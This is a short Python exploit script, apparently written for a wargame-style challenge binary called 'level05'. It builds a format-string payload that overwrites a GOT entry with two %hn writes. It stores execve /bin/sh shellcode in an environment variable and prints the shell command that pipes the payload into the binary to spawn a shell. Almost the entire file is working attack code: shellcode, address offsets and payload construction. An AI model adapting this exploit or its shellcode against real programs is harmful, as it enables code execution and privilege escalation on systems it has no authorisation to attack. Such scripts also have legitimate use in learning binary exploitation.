#!/usr/bin/env python3

import struct

def p(x): return struct.pack('<I', x)
def prnt(x): return (x >= 0x20 and x <= 0x7e)

shellcode = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
sh_addr = 0xffffdf15 # dans l'env

target = 0x080497e0 # got 
target2 = target + 0x2
to_write = 0xdef8 
to_write2 = 0xffff 

if to_write2 < to_write: # ensure the lower write is done first
    to_write, to_write2 = to_write2, to_write
    target, target2 = target2, target

payload = b''
written = 0

payload += p(target)
written += 4
payload += b"lmao"
written += 4
payload += p(target2)
written += 4
payload += b'%010p'*8
written += 10 * 8
# add whatever we need to get to to_write
to_write_la = to_write - written
payload += b'%0' + str(to_write_la).encode() + b'p'
written += to_write_la 
# written += 10
payload += b'%hn'
# add whatever we need to get to to_write2
to_write_la = to_write2 - written
payload += b'%0' + str(to_write_la).encode() + b'p'
written += to_write_la
payload += b'%hn'

# payload += b"%0" + str(sh_addr).encode() + b"p"
# payload += b'%n'

print("export OUIOUI=$'", end='')
for s in shellcode:
    print("\\x%02x" % s, end='')
print("'")

print()

print("(echo -en '", end='')
for c in payload:
    if prnt(c):
        print(chr(c), end='')
    else:
        print(f'\\x{c:02x}', end='')
print("'; cat) | ./level05")
# print("' > /tmp/sexe)")
